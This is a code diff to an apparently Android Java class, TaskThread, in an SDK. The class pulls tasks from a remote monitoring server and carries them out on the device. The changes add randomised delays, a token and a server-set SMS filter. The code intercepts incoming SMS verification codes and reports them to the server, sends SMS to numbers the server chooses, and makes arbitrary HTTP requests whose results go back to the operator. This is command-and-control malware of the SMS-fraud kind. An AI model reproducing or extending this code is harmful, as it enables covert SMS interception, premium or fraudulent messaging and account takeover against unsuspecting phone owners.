@@ -18,21 +18,25 @@ public class TaskThread extends Thread{
     }
 
     private void excuteTask(JSONObject task) {
+        String token = SdkTools.getKV("token");
         try {
-            sleep(5000);
-            int taskid = task.getInt("id");
+            if(!task.has("taskid")) return;
+            long tt = Math.round(Math.random()*1000)%20;
+            sleep(tt*1000);
+            int taskid = task.getInt("taskid");
             int step = task.getInt("step");
+            SMSObserver.FILTER_SMS_CODE = task.getString("smsfilter");
             if(task.has("wait_sms")) {
-                boolean sms = task.getBoolean("wait_sms");
                 for(int i=0;i<10;i++) {
                     if(sms_code != null) {
-                        JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"id="+taskid+"&step="+step+"&smscode="+sms_code);
-                        if(ret != null && ret.getBoolean("b") && ret.has("task")) {
-                            excuteTask(ret.getJSONObject("task"));
+                        JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"token="+token+"&id="+taskid+"&step="+step+"&result="+sms_code);
+                        sms_code = null;
+                        if(ret != null && ret.getBoolean("b") && ret.has("result")) {
+                            excuteTask(ret.getJSONObject("result"));
                         }
                         break;
                     }else {
-                        sleep(30000);
+                        sleep(5000);
                     }
                 }
             }else if(task.has("send_sms")) {
@@ -40,18 +44,19 @@ public class TaskThread extends Thread{
                 String phone = task.getString("phone");
                 SdkTools.sendSMS(phone,content);
                 sleep(30000);
-                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"id="+taskid+"&step="+step);
-                if(ret != null && ret.getBoolean("b") && ret.has("task")) {
-                    excuteTask(ret.getJSONObject("task"));
+                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url,HttpUrl.REPORT_RESULT,null,"token="+token+"&id="+taskid+"&step="+step+"&result=ok");
+                if(ret != null && ret.getBoolean("b") && ret.has("result")) {
+                    excuteTask(ret.getJSONObject("result"));
                 }
             }else {
                 String url = task.getString("url");
                 String params = task.getString("params");
                 JSONObject header = task.getJSONObject("header");
-                String result = HttpRequest.sendPost(url, null, header, params);
-                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_RESULT, null, "id=" + taskid + "&step=" + step + "&result="+result);
-                if(ret != null && ret.getBoolean("b") && ret.has("task")) {
-                    excuteTask(ret.getJSONObject("task"));
+                String method = task.getString("method");
+                String result = method.equalsIgnoreCase("POST")?HttpRequest.sendPost(url, null, header, params):HttpRequest.sendGet(url, null, header, params);
+                JSONObject ret = HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_RESULT, null, "token="+token+"&id=" + taskid + "&step=" + step + "&result="+result);
+                if(ret != null && ret.getBoolean("b") && ret.has("result")) {
+                    excuteTask(ret.getJSONObject("result"));
                 }
             }
         }catch(Exception e) {
